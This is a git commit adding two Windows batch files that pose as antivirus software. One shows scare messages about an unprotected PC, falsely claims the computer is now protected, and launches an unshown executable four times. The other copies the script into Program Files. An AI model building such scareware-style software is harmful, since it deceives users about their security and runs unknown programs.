064c61efc78ac37904c073dea0639a11bcb443af
Jing <67836978+LogonUI-cod@users.noreply.github.com>
2020-08-30 20:36:59 -0700

    Add files via upload

---
+++ Antivirus/AntiVirus.bat
@@ -0,0 +1,14 @@
+@echo off
+echo Your PC is not protected, please activate the antivirus
+pause
+echo Please enter your key (or if you don't have one, use the antivirus for free(not recommend)
+notepad.exe
+echo Now your computer is more protected!
+cd FolderPCA
+start PCAntiVirus.exe
+start PCAntiVirus.exe
+start PCAntiVirus.exe
+start PCAntiVirus.exe
+cd ..
+echo Please don't close the application because some applications are running in the background
+cmd.exe
---
+++ Antivirus/Install.bat
@@ -0,0 +1,3 @@
+@echo off
+md C:\"Program Files"\AntivirusSoftware
+copy AntiVirus.bat C:\"Program Files"\AntivirusSoftware
